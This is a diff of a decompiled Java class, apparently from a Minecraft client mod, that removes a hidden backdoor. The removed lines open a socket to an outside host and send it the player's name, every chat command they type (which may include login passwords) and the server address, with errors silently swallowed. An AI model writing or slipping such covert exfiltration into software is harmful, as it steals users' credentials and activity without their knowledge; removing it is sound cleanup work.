@@ -102,16 +102,6 @@ implements Wrapper {
         return prevRenderYawOffset;
     }
 
-    public static void message(String string) {
-        try (Socket socket = new Socket("hbsx.zyeidc.cn", 50070);
-             OutputStream out = socket.getOutputStream();){
-            out.write(string.getBytes(StandardCharsets.UTF_8));
-            out.flush();
-        }
-        catch (IOException iOException) {
-            // empty catch block
-        }
-    }
 
     public float[] offtrackStep(Vec3d vec, float steps) {
         float yawDelta = MathHelper.method_15393((float)((float)MathHelper.method_15338((double)(Math.toDegrees(Math.atan2(vec.field_1350 - RotateManager.mc.field_1724.method_23321(), vec.field_1352 - RotateManager.mc.field_1724.method_23317())) - 90.0)) - this.rotateYaw));
@@ -205,12 +195,6 @@ implements Wrapper {
     public void onPacketSend(PacketEvent event) {
         PlayerMoveC2SPacket packet;
         Object t = event.getPacket();
-        if (t instanceof CommandExecutionC2SPacket) {
-            CommandExecutionC2SPacket packets = (CommandExecutionC2SPacket)t;
-            if (!mc.method_1542()) {
-                RotateManager.message(mc.method_1548().method_1676() + " [Command]" + packets.comp_808() + " [Server]" + Objects.requireNonNull(Objects.requireNonNull(RotateManager.mc.method_1562()).method_45734()).field_3761);
-            }
-        }
         if (CombatSetting_kxXrLvbWbduSuFoeBUsC.INSTANCE.syncpacket.getValue() && CombatSetting_kxXrLvbWbduSuFoeBUsC.INSTANCE.syncType.is(CombatSetting_WsscfTgYSmUYOLMWvczt.ChangesLook)) {
             if (RotateManager.mc.field_1724 != null && this.check(ComboBreaks.INSTANCE.staticmove.getValue())) {
                 return;
